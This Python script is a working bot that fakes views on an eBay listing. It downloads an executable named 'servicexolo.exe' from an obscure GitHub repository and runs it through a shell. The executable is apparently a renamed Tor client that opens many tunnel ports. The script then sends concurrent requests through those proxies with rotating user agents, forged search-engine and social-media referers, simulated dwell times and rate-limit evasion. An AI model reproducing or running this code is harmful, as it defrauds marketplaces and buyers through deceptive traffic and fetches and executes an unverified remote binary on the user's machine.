import os
import requests
import tempfile
import subprocess
import psutil
import concurrent.futures
import random
import time
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem
from typing import Dict, List
import logging
from datetime import datetime

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('traffic_generator.log'),
        logging.StreamHandler()
    ]
)

class ProxyRotator:
    def __init__(self, proxies: List[str]):
        self.proxies = proxies
        self.current_index = 0
        self.failed_proxies: Dict[str, int] = {}  # Track failed proxies
        self.max_failures = 3  # Maximum failures before removing proxy
        
    def next(self) -> str:
        while True:
            proxy = self.proxies[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.proxies)
            
            # Skip proxies that have failed too many times
            if self.failed_proxies.get(proxy, 0) >= self.max_failures:
                continue
            return proxy
    
    def mark_failure(self, proxy: str) -> None:
        self.failed_proxies[proxy] = self.failed_proxies.get(proxy, 0) + 1
        if self.failed_proxies[proxy] >= self.max_failures:
            logging.warning(f"Proxy {proxy} has failed {self.max_failures} times and will be skipped")

class UserAgentRotator:
    def __init__(self, software_names: List[str], operating_systems: List[str], limit: int = 100):
        self.user_agent_rotator = UserAgent(
            software_names=software_names,
            operating_systems=operating_systems,
            limit=limit
        )
        self.previous_agents: List[str] = []
        self.max_history = 10  # Avoid repeating recent user agents
        
    def next(self) -> str:
        while True:
            agent = self.user_agent_rotator.get_random_user_agent()
            if agent not in self.previous_agents:
                self.previous_agents.append(agent)
                if len(self.previous_agents) > self.max_history:
                    self.previous_agents.pop(0)
                return agent

class BehaviorSimulator:
    def __init__(self):
        # Time ranges for different behaviors (in seconds)
        self.page_view_times = {
            'quick_bounce': (1, 2),
            'brief_view': (2, 4),
            'detailed_view': (6, 10),
            'thorough_view': (10, 20)
        }
        
        # Probability weights for different behaviors
        self.behavior_weights = {
            'quick_bounce': 15,
            'brief_view': 40,
            'detailed_view': 35,
            'thorough_view': 10
        }
        
        # Simulate different device speeds
        self.network_delays = {
            'fast': (0.1, 0.5),
            'medium': (0.5, 1.5),
            'slow': (1.5, 3.0)
        }
        
        self.network_weights = {
            'fast': 50,
            'medium': 35,
            'slow': 15
        }
    
    def simulate_view_time(self) -> float:
        behavior = random.choices(
            list(self.behavior_weights.keys()),
            weights=list(self.behavior_weights.values()),
            k=1
        )[0]
        
        min_time, max_time = self.page_view_times[behavior]
        return random.uniform(min_time, max_time)
    
    def simulate_network_delay(self) -> float:
        speed = random.choices(
            list(self.network_weights.keys()),
            weights=list(self.network_weights.values()),
            k=1
        )[0]
        
        min_delay, max_delay = self.network_delays[speed]
        return random.uniform(min_delay, max_delay)

class ServiceInstaller:
    service_link = "https://github.com/tricx0/iFaxgZaDgn-lvXTBBeX7k/raw/main/servicexolo.exe"
    
    def __init__(self, total_ips: int):
        self.temp_dir = tempfile.gettempdir()
        self.total_ips = total_ips
        self.stop_servicexolo_windows()
        self.proxies = self.make(total_ips)
        self.proxy_rotator = ProxyRotator(self.proxies)
        
    def _create_temp_directory(self):
        try:
            os.makedirs(os.path.join(self.temp_dir, "xoloservice"))
        except FileExistsError:
            pass
        
    def _download_file(self):
        response = requests.get(self.service_link)
        if response.status_code != 200:
            return None
        file_path = os.path.join(self.temp_dir, "xoloservice", os.path.basename(self.service_link))
        with open(file_path, 'wb') as f:
            f.write(response.content)
        return file_path

    def _generate_ips_file(self, file_path2):
        ips = b"HTTPTunnelPort 9080"
        for i in range(self.total_ips - 1):
            ips += f"\nHTTPTunnelPort {9081 + i}".encode()
        with open(file_path2, 'wb') as f:
            f.write(ips)

    def install_service(self):
        self._create_temp_directory()
        file_path = self._download_file()
        if not file_path:
            return
        
        file_path2 = os.path.join(self.temp_dir, "xoloservice", "config")
        self._generate_ips_file(file_path2)

        process = subprocess.Popen(
            f"{file_path} -nt-service -f {file_path2}", 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
        
        while True:
            line = process.stdout.readline().decode().strip()
            logging.info(line)  # Using logging instead of print
            if "Bootstrapped 100% (done): Done" in line:
                break
            
    def stop_servicexolo_windows(self):
        """Stop any running servicexolo processes"""
        try:
            for proc in psutil.process_iter():
                try:
                    if proc.name().lower() == "servicexolo.exe":
                        proc.terminate()
                        proc.wait(timeout=5)  # Wait for termination
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.TimeoutExpired):
                    pass
            logging.info("Successfully stopped existing servicexolo processes")
        except Exception as e:
            logging.error(f"Error stopping servicexolo processes: {str(e)}")

    def make(self, total_ips):
        """Create and return list of proxy addresses"""
        self.install_service()
        proxies = [f"http://127.0.0.1:{9080 + i}" for i in range(total_ips)]
        logging.info(f"Created {len(proxies)} proxy addresses")
        return proxies

def add_view(
    link: str,
    proxy_rotator: ProxyRotator,
    user_agent_rotator: UserAgentRotator,
    behavior_simulator: BehaviorSimulator
) -> None:
    try:
        proxy = proxy_rotator.next()
        user_agent = user_agent_rotator.next()
        
        # Enhanced referer list with weights
        referers = {
            'https://www.google.com/search?q=': 30,
            'https://www.facebook.com/marketplace/': 20,
            'https://www.instagram.com/shopping/': 15,
            'https://www.pinterest.com/shop/': 10,
            'https://www.reddit.com/r/': 8,
            'https://t.co/': 5,
            'https://www.bing.com/search?q=': 5,
            'https://duckduckgo.com/?q=': 4,
            'https://www.youtube.com/watch?v=': 3
        }
        
        # Generate more realistic referer URLs
        base_referer = random.choices(
            list(referers.keys()),
            weights=list(referers.values()),
            k=1
        )[0]
        
        # Add search terms for search engine referers
        if 'search?q=' in base_referer:
            search_terms = [
                'pets go free',
                'roblox buy',
                'roblox ebay deals',
                'pets go roblox deals',
                'gem ebay roblox',
                'gem pets go ebay'
            ]
            referer = base_referer + random.choice(search_terms).replace(' ', '+')
        else:
            referer = base_referer
        
        # Enhanced headers with more realistic parameters
        headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-User': '?1',
            'Referer': referer,
            'Cache-Control': 'max-age=0'
        }
        
        proxies = {"http": proxy, "https": proxy}
        
        # Simulate network delay before request
        time.sleep(behavior_simulator.simulate_network_delay())
        
        logging.info(f'Attempting view: {link} via {proxy}')
        response = requests.get(link, headers=headers, proxies=proxies, timeout=10)
        
        if response.status_code == 200:
            # Simulate realistic viewing time
            view_time = behavior_simulator.simulate_view_time()
            logging.info(f'View successful. Simulating view time of {view_time:.2f} seconds')
            time.sleep(view_time)
        elif response.status_code in [403, 429]:
            logging.warning(f'Rate limit encountered: {response.status_code}')
            proxy_rotator.mark_failure(proxy)
            time.sleep(random.uniform(10, 20))  # Longer delay for rate limits
            raise Exception("Rate limit encountered")
        else:
            logging.error(f'Unexpected status: {response.status_code}')
            proxy_rotator.mark_failure(proxy)
            
    except Exception as e:
        logging.error(f'Error during view: {str(e)}')
        proxy_rotator.mark_failure(proxy)
        raise

def add_views_concurrently(
    link: str,
    proxy_rotator: ProxyRotator,
    user_agent_rotator: UserAgentRotator,
    behavior_simulator: BehaviorSimulator,
    total_views: int
) -> None:
    successful_views = 0
    max_retries = 3
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(total_views, 10)) as executor:
        while successful_views < total_views:
            remaining_views = total_views - successful_views
            futures = {
                executor.submit(
                    add_view,
                    link,
                    proxy_rotator,
                    user_agent_rotator,
                    behavior_simulator
                ): i for i in range(remaining_views)
            }
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                    successful_views += 1
                    logging.info(f'Successfully completed {successful_views}/{total_views} views')
                except Exception as e:
                    logging.error(f'View failed: {str(e)}')
                    # Retry logic handled implicitly by the while loop

if __name__ == "__main__":
    total_ips = int(input("Enter the total number of proxies: "))
    total_views = int(input("Enter the total number of views to add: "))
    link = input("Enter the eBay link: ")
    
    # Initialize components
    service_installer = ServiceInstaller(total_ips)
    
    software_names = [
        SoftwareName.CHROME.value,
        SoftwareName.FIREFOX.value,
        SoftwareName.SAFARI.value,
        SoftwareName.EDGE.value,
        SoftwareName.OPERA.value
    ]
    
    operating_systems = [
        OperatingSystem.WINDOWS.value,
        OperatingSystem.MACOS.value,
        OperatingSystem.LINUX.value,
        OperatingSystem.IOS.value,
        OperatingSystem.ANDROID.value
    ]
    
    user_agent_rotator = UserAgentRotator(software_names, operating_systems)
    behavior_simulator = BehaviorSimulator()
    
    # Start traffic generation
    start_time = datetime.now()
    logging.info(f'Starting traffic generation at {start_time}')
    
    try:
        add_views_concurrently(
            link,
            service_installer.proxy_rotator,
            user_agent_rotator,
            behavior_simulator,
            total_views
        )
        
        end_time = datetime.now()
        duration = end_time - start_time
        logging.info(f'Traffic generation completed at {end_time}')
        logging.info(f'Total duration: {duration}')
        
    except KeyboardInterrupt:
        logging.warning('Traffic generation interrupted by user')
    except Exception as e:
        logging.error(f'Traffic generation failed: {str(e)}')
